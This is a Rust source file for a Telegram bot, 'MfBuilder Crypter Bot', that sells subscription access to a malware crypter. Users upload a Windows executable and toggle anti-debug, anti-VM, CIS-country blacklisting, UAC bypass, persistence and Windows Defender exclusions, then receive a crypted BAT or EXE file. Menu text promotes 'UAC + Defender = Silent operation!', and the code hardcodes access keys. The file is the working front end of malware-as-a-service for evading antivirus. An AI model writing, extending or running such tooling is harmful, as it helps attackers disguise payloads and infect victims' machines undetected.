use teloxide::{prelude::*, utils::command::BotCommands};
use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use std::fs;
use crate::binary_arch::BinaryArch;

// Configuration for each user session
#[derive(Clone, Debug)]
pub struct UserSession {
    pub authenticated: bool,
    pub subscription_active: bool,
    pub subscription_expiry: Option<String>,
    pub awaiting_binary: bool,
    pub awaiting_crypt_confirmation: bool,
    pub awaiting_key: bool,
    pub awaiting_redeem_code: bool,
    pub config: BuildConfig,
}

#[derive(Clone, Debug)]
pub struct BuildConfig {
    pub anti_debug: bool,
    pub anti_virtual_machine: bool,
    pub blacklist_cis_countries: bool,
    pub uac_bypass: bool,
    pub single_instance: bool,
    pub run_on_startup: bool,
    pub defender_exclusion: bool,
    pub defender_exclude_drive: bool,
    pub file_extension: String,
    pub binary_path: Option<String>,
    pub binary_arch: Option<BinaryArch>,
}

impl Default for BuildConfig {
    fn default() -> Self {
        BuildConfig {
            anti_debug: false,
            anti_virtual_machine: false,
            blacklist_cis_countries: false,
            uac_bypass: false,
            single_instance: false,
            run_on_startup: false,
            defender_exclusion: false,
            defender_exclude_drive: false,
            file_extension: "BAT".to_string(),
            binary_path: None,
            binary_arch: None,
        }
    }
}

impl Default for UserSession {
    fn default() -> Self {
        UserSession {
            authenticated: false,
            subscription_active: false,
            subscription_expiry: None,
            awaiting_binary: false,
            awaiting_crypt_confirmation: false,
            awaiting_key: false,
            awaiting_redeem_code: false,
            config: BuildConfig::default(),
        }
    }
}

pub type Sessions = Arc<Mutex<HashMap<ChatId, UserSession>>>;

#[derive(BotCommands, Clone)]
#[command(rename_rule = "lowercase", description = "Supported commands:")]
enum Command {
    #[command(description = "Start the bot")]
    Start,
    #[command(description = "Show help")]
    Help,
    #[command(description = "Reset session")]
    Reset,
}

const VALID_KEY: &str = "MfCrypter2024"; // Legacy auth key
pub const SUBSCRIPTION_CODES: &[&str] = &[
    "MFCRYPT-LIFETIME-2024",
    "FLORIN-VIP-BETA",
    "BACKDOORSKID-PRO",
]; // Add your subscription codes here

pub async fn run_telegram_bot() {
    pretty_env_logger::init();
    log::info!("Starting MfBuilder Telegram Bot...");

    let bot = Bot::from_env();
    let sessions: Sessions = Arc::new(Mutex::new(HashMap::new()));

    let handler = dptree::entry()
        .branch(Update::filter_message()
            .branch(
                dptree::entry()
                    .filter_command::<Command>()
                    .endpoint(command_handler),
            )
            .branch(
                dptree::filter(|msg: Message| msg.document().is_some())
                    .endpoint(handle_document),
            )
            .branch(dptree::endpoint(message_handler)))
        .branch(Update::filter_callback_query().endpoint(crate::telegram_bot_callbacks::callback_handler));

    Dispatcher::builder(bot, handler)
        .dependencies(dptree::deps![sessions])
        .enable_ctrlc_handler()
        .build()
        .dispatch()
        .await;
}

async fn command_handler(
    bot: Bot,
    msg: Message,
    cmd: Command,
    sessions: Sessions,
) -> ResponseResult<()> {
    match cmd {
        Command::Start => {
            send_welcome_message(&bot, &msg).await?;
        }
        Command::Help => {
            bot.send_message(msg.chat.id, "?? **MfBuilder Crypter Bot**\n\n\
                Commands:\n\
                /start - Start the bot\n\
                /help - Show this help\n\
                /reset - Reset your session\n\n\
                To begin, send your authentication key.")
                .await?;
        }
        Command::Reset => {
            sessions.lock().unwrap().remove(&msg.chat.id);
            bot.send_message(msg.chat.id, "? Session reset. Send /start to begin again.")
                .await?;
        }
    }
    Ok(())
}

async fn send_welcome_message(bot: &Bot, msg: &Message) -> ResponseResult<()> {
    bot.send_message(
        msg.chat.id,
        "?? **Welcome to MfBuilder Crypter Bot**\n\n\
        Please enter your authentication key to continue:",
    )
    .await?;
    Ok(())
}

async fn message_handler(
    bot: Bot,
    msg: Message,
    sessions: Sessions,
) -> ResponseResult<()> {
    let chat_id = msg.chat.id;
    let text = msg.text().unwrap_or("");

    let mut sessions_lock = sessions.lock().unwrap();
    let session = sessions_lock.entry(chat_id).or_insert_with(UserSession::default);
    
    // Handle redeem code input
    if session.awaiting_redeem_code {
        session.awaiting_redeem_code = false;
        let is_valid = SUBSCRIPTION_CODES.contains(&text);
        
        if is_valid {
            session.subscription_active = true;
            session.subscription_expiry = Some("Lifetime".to_string());
            drop(sessions_lock);
            
            bot.send_message(
                chat_id,
                "?? **Subscription Activated!**\n\n\
                ? Your subscription is now **ACTIVE**\n\
                ? Expires: **Lifetime**\n\n\
                You now have full access to all features!\n\n\
                Click **Crypt File** to get started!"
            ).await?;
            
            crate::telegram_bot_handlers::handle_main_menu(bot, chat_id).await?;
            return Ok(());
        } else {
            drop(sessions_lock);
            
            bot.send_message(
                chat_id,
                "? **Invalid Code**\n\n\
                The code you entered is not valid.\n\n\
                Please check your code and try again.\n\n\
                ?? Need help? Click Support in the main menu."
            ).await?;
            
            crate::telegram_bot_handlers::handle_main_menu(bot, chat_id).await?;
            return Ok(());
        }
    }

    if !session.authenticated {
        // Check authentication key
        if text == VALID_KEY {
            session.authenticated = true;
            session.awaiting_crypt_confirmation = true;
            drop(sessions_lock);
            bot.send_message(chat_id, "? **Authentication successful!**\n\n\
                Do you want to crypt a binary?\n\
                Reply: **yes** or **no**")
                .await?;
        } else {
            bot.send_message(chat_id, "? Invalid key. Please try again or use /start.")
                .await?;
        }
        return Ok(());
    }

    if session.awaiting_crypt_confirmation {
        if text.to_lowercase() == "yes" {
            session.awaiting_crypt_confirmation = false;
            session.awaiting_binary = true;
            drop(sessions_lock);
            bot.send_message(
                chat_id,
                "?? **Please upload your binary (.exe file)**\n\n\
                ?? Only .exe files are supported!"
            )
            .await?;
        } else {
            drop(sessions_lock);
            bot.send_message(chat_id, "?? Operation cancelled. Send /start to begin again.")
                .await?;
        }
        return Ok(());
    }

    // Check if it's a configuration toggle
    drop(sessions_lock);
    if handle_config_toggle(bot.clone(), msg.clone(), sessions.clone(), text).await? {
        return Ok(());
    }

    Ok(())
}

async fn handle_document(
    bot: Bot,
    msg: Message,
    sessions: Sessions,
) -> ResponseResult<()> {
    let chat_id = msg.chat.id;

    let mut sessions_lock = sessions.lock().unwrap();
    let session = sessions_lock.entry(chat_id).or_insert_with(UserSession::default);

    if !session.authenticated {
        drop(sessions_lock);
        bot.send_message(chat_id, "? Please authenticate first using /start")
            .await?;
        return Ok(());
    }

    if !session.awaiting_binary {
        drop(sessions_lock);
        bot.send_message(chat_id, "? I wasn't expecting a file. Use /start to begin.")
            .await?;
        return Ok(());
    }

    let document = msg.document().unwrap();
    let file_name = document.file_name.as_ref().unwrap();

    // Check if it's an .exe file
    if !file_name.ends_with(".exe") {
        drop(sessions_lock);
        bot.send_message(chat_id, "? Only .exe files are supported!")
            .await?;
        return Ok(());
    }

    // Download the file
    let file = bot.get_file(&document.file.id).await?;
    let file_path = format!("temp_{}_{}", chat_id, file_name);
    
    let file_bytes = bot.download_file(&file.path).await?;
    fs::write(&file_path, &file_bytes)?;

    // Detect binary architecture
    let binary_arch = BinaryArch::determine(&file_bytes);
    
    if binary_arch == BinaryArch::Unknown {
        fs::remove_file(&file_path).ok();
        drop(sessions_lock);
        bot.send_message(chat_id, "? Unable to detect binary type. Please upload a valid PE executable.")
            .await?;
        return Ok(());
    }

    session.config.binary_path = Some(file_path);
    session.config.binary_arch = Some(binary_arch.clone());
    session.awaiting_binary = false;

    let arch_str = match binary_arch {
        BinaryArch::X64 => "Native x64",
        BinaryArch::X86 => "Native x86",
        BinaryArch::NET64 => ".NET x64",
        BinaryArch::NET86 => ".NET x86",
        BinaryArch::Unknown => "Unknown",
    };

    drop(sessions_lock);

    bot.send_message(
        chat_id,
        format!("? **Binary uploaded successfully!**\n\
            ?? Detected Type: **{}**\n\n\
            Now let's configure the crypter options...",
            arch_str
        )
    )
    .await?;

    // Show configuration menu
    show_config_menu(bot.clone(), chat_id, sessions.clone()).await?;

    Ok(())
}

pub async fn show_config_menu(
    bot: Bot,
    chat_id: ChatId,
    sessions: Sessions,
) -> ResponseResult<()> {
    let sessions_lock = sessions.lock().unwrap();
    let session = sessions_lock.get(&chat_id).unwrap();
    let config = &session.config;

    // Create inline keyboard with interactive buttons
    let keyboard = InlineKeyboardMarkup::new(vec![
        // Row 1: Anti Debug & Anti VM
        vec![
            InlineKeyboardButton::callback(
                format!("{} Anti Debug", if config.anti_debug { "?" } else { "?" }),
                "toggle_anti_debug"
            ),
            InlineKeyboardButton::callback(
                format!("{} Anti VM", if config.anti_virtual_machine { "?" } else { "?" }),
                "toggle_anti_vm"
            ),
        ],
        // Row 2: Blacklist CIS & UAC Bypass
        vec![
            InlineKeyboardButton::callback(
                format!("{} Blacklist CIS", if config.blacklist_cis_countries { "?" } else { "?" }),
                "toggle_blacklist_cis"
            ),
            InlineKeyboardButton::callback(
                format!("{} UAC Bypass", if config.uac_bypass { "?" } else { "?" }),
                "toggle_uac_bypass"
            ),
        ],
        // Row 3: Single Instance & Persistence
        vec![
            InlineKeyboardButton::callback(
                format!("{} Single Instance", if config.single_instance { "?" } else { "?" }),
                "toggle_single_instance"
            ),
            InlineKeyboardButton::callback(
                format!("{} Persistence", if config.run_on_startup { "?" } else { "?" }),
                "toggle_persistence"
            ),
        ],
        // Row 4: Defender Exclusion & C:\ Drive
        vec![
            InlineKeyboardButton::callback(
                format!("{} Defender {}", 
                    if config.defender_exclusion { "?" } else { "?" },
                    if config.uac_bypass && config.defender_exclusion { "??" } else { "" }
                ),
                "toggle_defender"
            ),
            InlineKeyboardButton::callback(
                format!("{} C:\\ Drive {}", 
                    if config.defender_exclude_drive { "?" } else { "?" },
                    if config.defender_exclude_drive { "??" } else { "" }
                ),
                "toggle_drive_exclusion"
            ),
        ],
        // Row 5: Output Format
        vec![
            InlineKeyboardButton::callback(
                format!("?? Output: {}", config.file_extension),
                "toggle_format"
            ),
        ],
        // Row 6: Build button
        vec![
            InlineKeyboardButton::callback(
                "?? BUILD NOW",
                "start_build"
            ),
        ],
    ]);

    let menu_text = format!(
        "?? **Crypter Configuration**\n\n\
        Click the buttons below to toggle options:\n\
        ? = Enabled | ? = Disabled\n\n\
        **Current Settings**:\n\
        ? Anti Debug: {}\n\
        ? Anti VM: {}\n\
        ? Blacklist CIS: {}\n\
        ? UAC Bypass: {}\n\
        ? Single Instance: {}\n\
        ? Persistence: {}\n\
        ? Defender Exclusion: {} {}\n\
        ? C:\\ Drive Exclusion: {} {}\n\
        ? Output Format: **{}**\n\n\
        {}",
        if config.anti_debug { "? ON" } else { "? OFF" },
        if config.anti_virtual_machine { "? ON" } else { "? OFF" },
        if config.blacklist_cis_countries { "? ON" } else { "? OFF" },
        if config.uac_bypass { "? ON" } else { "? OFF" },
        if config.single_instance { "? ON" } else { "? OFF" },
        if config.run_on_startup { "? ON" } else { "? OFF" },
        if config.defender_exclusion { "? ON" } else { "? OFF" },
        if config.uac_bypass && config.defender_exclusion { "?? Silent with UAC!" } else { "" },
        if config.defender_exclude_drive { "? ON" } else { "? OFF" },
        if config.defender_exclude_drive { "?? AGGRESSIVE!" } else { "" },
        config.file_extension,
        if config.uac_bypass && config.defender_exclusion {
            "?? **Pro Tip**: UAC + Defender = Silent operation!"
        } else { "" }
    );

    drop(sessions_lock);
    bot.send_message(chat_id, menu_text)
        .reply_markup(keyboard)
        .await?;
    
    Ok(())
}

// Legacy text-based config menu for backwards compatibility
async fn show_config_menu_legacy(
    bot: &Bot,
    chat_id: ChatId,
    sessions: Sessions,
) -> ResponseResult<()> {
    let sessions_lock = sessions.lock().unwrap();
    let session = sessions_lock.get(&chat_id).unwrap();
    let config = &session.config;

    let menu = format!(
        "?? **Crypter Configuration**\n\n\
        1. Anti Debug: {}\n\
        2. Anti VM: {}\n\
        3. Blacklist CIS Countries: {}\n\
        4. UAC Bypass: {}\n\
        5. Single Instance: {}\n\
        6. Persistence: {}\n\
        7. Windows Defender Exclusion: {} {}\n\
        8. Exclude C:\\ Drive: {} {}\n\
        9. Output Format: **{}**\n\n\
        ?? To toggle an option, send its number (e.g., '1')\n\
        ?? To change output format, send 'format' (BAT/EXE)\n\
        ? When done, send '**build**' to create your crypted binary!",
        if config.anti_debug { "? ON" } else { "? OFF" },
        if config.anti_virtual_machine { "? ON" } else { "? OFF" },
        if config.blacklist_cis_countries { "? ON" } else { "? OFF" },
        if config.uac_bypass { "? ON" } else { "? OFF" },
        if config.single_instance { "? ON" } else { "? OFF" },
        if config.run_on_startup { "? ON" } else { "? OFF" },
        if config.defender_exclusion { "? ON" } else { "? OFF" },
        if config.uac_bypass && config.defender_exclusion { "?? (Silent with UAC!)" } else { "" },
        if config.defender_exclude_drive { "? ON" } else { "? OFF" },
        if config.defender_exclude_drive { "?? AGGRESSIVE!" } else { "" },
        config.file_extension
    );

    drop(sessions_lock);
    bot.send_message(chat_id, menu).await?;
    
    Ok(())
}

// Add message handler for configuration toggles
pub async fn handle_config_toggle(
    bot: Bot,
    msg: Message,
    sessions: Sessions,
    text: &str,
) -> ResponseResult<bool> {
    let chat_id = msg.chat.id;
    
    let mut sessions_lock = sessions.lock().unwrap();
    let session = match sessions_lock.get_mut(&chat_id) {
        Some(s) if s.authenticated && s.config.binary_path.is_some() => s,
        _ => return Ok(false),
    };

    let mut updated = false;

    match text {
        "1" => {
            session.config.anti_debug = !session.config.anti_debug;
            updated = true;
        }
        "2" => {
            session.config.anti_virtual_machine = !session.config.anti_virtual_machine;
            updated = true;
        }
        "3" => {
            session.config.blacklist_cis_countries = !session.config.blacklist_cis_countries;
            updated = true;
        }
        "4" => {
            session.config.uac_bypass = !session.config.uac_bypass;
            updated = true;
        }
        "5" => {
            session.config.single_instance = !session.config.single_instance;
            updated = true;
        }
        "6" => {
            session.config.run_on_startup = !session.config.run_on_startup;
            updated = true;
        }
        "7" => {
            session.config.defender_exclusion = !session.config.defender_exclusion;
            updated = true;
        }
        "8" => {
            session.config.defender_exclude_drive = !session.config.defender_exclude_drive;
            updated = true;
        }
        "format" => {
            session.config.file_extension = if session.config.file_extension == "BAT" {
                "EXE".to_string()
            } else {
                "BAT".to_string()
            };
            updated = true;
        }
        "build" => {
            drop(sessions_lock);
            start_build_process(bot, chat_id, sessions).await?;
            return Ok(true);
        }
        _ => {}
    }

    if updated {
        drop(sessions_lock);
        show_config_menu(&bot, chat_id, sessions).await?;
    }

    Ok(updated)
}

pub async fn start_build_process(
    bot: Bot,
    chat_id: ChatId,
    sessions: Sessions,
) -> ResponseResult<()> {
    use crate::{MfBuilder, SupportedFileExtension, binary_arch::BinaryArch};
    use teloxide::types::InputFile;
    use std::path::Path;

    bot.send_message(chat_id, "?? **Starting build process...**\n\n\
        This may take a few moments. Please wait...")
        .await?;

    let sessions_lock = sessions.lock().unwrap();
    let session = sessions_lock.get(&chat_id).unwrap();
    let config = session.config.clone();
    drop(sessions_lock);

    if config.binary_path.is_none() || config.binary_arch.is_none() {
        bot.send_message(chat_id, "? No binary uploaded. Please start over with /start")
            .await?;
        return Ok(());
    }

    let binary_path = config.binary_path.unwrap();
    let payload_bytes = match fs::read(&binary_path) {
        Ok(bytes) => bytes,
        Err(e) => {
            bot.send_message(chat_id, format!("? Failed to read binary: {}", e))
                .await?;
            return Ok(());
        }
    };

    // Create MfBuilder configuration
    let mut build_config = MfBuilder {
        build_arch: config.binary_arch.unwrap(),
        anti_debug: config.anti_debug,
        anti_virtual_machine: config.anti_virtual_machine,
        blacklist_cis_countries: config.blacklist_cis_countries,
        uac_bypass: config.uac_bypass,
        single_instance: config.single_instance,
        run_on_startup: config.run_on_startup,
        defender_exclusion: config.defender_exclusion,
        defender_exclude_drive: config.defender_exclude_drive,
        bind_file: false,
        file_extension: SupportedFileExtension::from_str(&config.file_extension),
        payload_bytes: payload_bytes.clone(),
        binder_file_bytes: Vec::new(),
    };

    // Copy the uploaded binary to payload.exe for the builder
    if let Err(e) = fs::write("payload.exe", &payload_bytes) {
        bot.send_message(chat_id, format!("? Failed to prepare payload: {}", e))
            .await?;
        fs::remove_file(&binary_path).ok();
        return Ok(());
    }

    bot.send_message(chat_id, "?? Building crypted binary...")
        .await?;

    // Run the build process in a blocking task
    let result = tokio::task::spawn_blocking(move || {
        crate::build_with_config(build_config);
    }).await;

    // Clean up temp files
    fs::remove_file(&binary_path).ok();
    fs::remove_file("payload.exe").ok();

    if result.is_err() {
        bot.send_message(chat_id, "? Build process failed!")
            .await?;
        return Ok(());
    }

    // Determine output filename
    let output_file = if config.file_extension == "BAT" {
        "out.bat"
    } else {
        "out.exe"
    };

    // Send the built file back to user
    if Path::new(output_file).exists() {
        bot.send_message(chat_id, "? **Build completed successfully!**\n\nSending your crypted binary...")
            .await?;

        let file = InputFile::file(output_file);
        bot.send_document(chat_id, file)
            .await?;

        bot.send_message(chat_id, "?? **Done!** Your crypted binary is ready!\n\n\
            Send /start to crypt another binary.")
            .await?;

        // Clean up output file
        fs::remove_file(output_file).ok();
    } else {
        bot.send_message(chat_id, "? Build completed but output file not found!")
            .await?;
    }

    Ok(())
}
